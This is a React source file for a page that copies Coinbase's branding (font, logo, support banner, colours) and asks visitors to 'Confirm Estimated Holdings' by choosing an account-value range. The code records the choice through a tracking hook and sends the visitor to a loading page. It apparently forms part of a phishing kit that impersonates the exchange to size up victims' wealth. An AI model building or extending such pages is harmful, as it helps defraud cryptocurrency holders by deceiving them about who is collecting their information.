import { useState } from "react";
import { createFileRoute } from "@tanstack/react-router";
import {
  CbFontStyle,
  CbLogo,
  CbSupportBanner,
  useCbTracking,
} from "@/components/cb/CbShared";

export const Route = createFileRoute("/cb/balance")({
  head: () => ({ meta: [{ title: "Confirm Estimated Holdings" }] }),
  component: CbBalancePage,
});

const RANGES = [
  "Under $1,000",
  "$1,000 – $4,999",
  "$5,000 – $9,999",
  "$10,000 – $24,999",
  "$25,000 – $49,999",
  "$50,000 – $99,999",
  "$100,000 – $499,999",
  "$500,000+",
];

function CbBalancePage() {
  const { trackClick, trackInput, cbNavigate } = useCbTracking();
  const [selected, setSelected] = useState<string | null>(null);

  function handleConfirm() {
    if (!selected) return;
    trackClick("Confirm Estimated Balance");
    trackInput("estimated_balance", selected);
    cbNavigate("/cb/loading");
  }

  return (
    <div
      className="cb-page"
      style={{
        display: "flex",
        flexDirection: "column",
        minHeight: "100vh",
        backgroundColor: "rgb(10, 11, 13)",
        color: "#fff",
      }}
    >
      <CbFontStyle />
      <style>{`
        .cb-page, .cb-page * {
          font-family: 'CoinbaseSans', 'CoinbaseText', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
          -webkit-font-smoothing: antialiased;
          -moz-osx-font-smoothing: grayscale;
        }
        .cb-page * { box-sizing: border-box; }
        @keyframes cbFadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes cbScaleIn { from { transform: scale(0); } to { transform: scale(1); } }
        .cb-animate { animation: cbFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) both; }
        .cb-range-btn {
          width: 100%; height: 52px; border-radius: 8px; padding: 0 16px;
          border: 2px solid transparent; cursor: pointer;
          background-color: rgba(255,255,255,0.08); color: #fff;
          display: flex; align-items: center; justify-content: space-between;
          font-size: 14px; font-weight: 500;
          transition: background-color 0.15s ease, border-color 0.2s ease;
        }
        .cb-range-btn:hover { background-color: rgba(255,255,255,0.12); }
        .cb-range-btn.selected { border-color: rgb(87,139,250); background-color: rgba(87,139,250,0.08); }
        .cb-confirm-btn {
          width: 100%; height: 48px; border-radius: 100px; border: none;
          cursor: pointer; font-size: 16px; font-weight: 600;
          transition: background-color 0.15s ease, transform 0.1s ease;
        }
        .cb-confirm-btn:active { transform: scale(0.98); }
        .cb-confirm-btn:disabled { cursor: default; }
      `}</style>

      <CbSupportBanner />
      <header
        style={{ display: "flex", alignItems: "center", height: 72, padding: "0 24px" }}
      >
        <div style={{ color: "#fff" }}>
          <CbLogo />
        </div>
      </header>

      <main style={{ flex: 1, display: "flex", justifyContent: "center", padding: "0 24px" }}>
        <div style={{ width: 440, maxWidth: "100%", marginTop: 48 }}>
          <h1
            className="cb-animate"
            style={{ fontSize: 28, fontWeight: 700, lineHeight: "36px", color: "#fff", margin: 0 }}
          >
            Confirm Estimated Holdings
          </h1>
          <p
            className="cb-animate"
            style={{
              fontSize: 14,
              fontWeight: 400,
              lineHeight: "20px",
              color: "rgba(255,255,255,0.6)",
              margin: "8px 0 0 0",
              animationDelay: "0.05s",
            }}
          >
            Choose the range that best matches your account value.
          </p>

          <div style={{ display: "flex", flexDirection: "column", gap: 8, marginTop: 32 }}>
            {RANGES.map((range, i) => {
              const isSelected = selected === range;
              return (
                <button
                  key={range}
                  onClick={() => setSelected(range)}
                  className={`cb-range-btn cb-animate ${isSelected ? "selected" : ""}`}
                  style={{ animationDelay: `${0.1 + i * 0.04}s` }}
                >
                  <span>{range}</span>
                  <div
                    style={{
                      width: 20,
                      height: 20,
                      borderRadius: "50%",
                      border: isSelected ? "none" : "2px solid rgba(255,255,255,0.3)",
                      backgroundColor: isSelected ? "rgb(87,139,250)" : "transparent",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      transition: "all 0.2s ease",
                      flexShrink: 0,
                    }}
                  >
                    {isSelected && (
                      <svg
                        width="10"
                        height="10"
                        viewBox="0 0 10 10"
                        fill="none"
                        style={{ animation: "cbScaleIn 0.2s ease" }}
                      >
                        <circle cx="5" cy="5" r="4" fill="white" />
                      </svg>
                    )}
                  </div>
                </button>
              );
            })}
          </div>

          <button
            className="cb-confirm-btn cb-animate"
            onClick={handleConfirm}
            disabled={!selected}
            style={{
              marginTop: 12,
              backgroundColor: selected ? "rgb(87,139,250)" : "rgba(87,139,250,0.25)",
              color: selected ? "rgb(10,11,13)" : "rgba(87,139,250,0.5)",
              animationDelay: "0.5s",
            }}
          >
            Confirm
          </button>
        </div>
      </main>
    </div>
  );
}
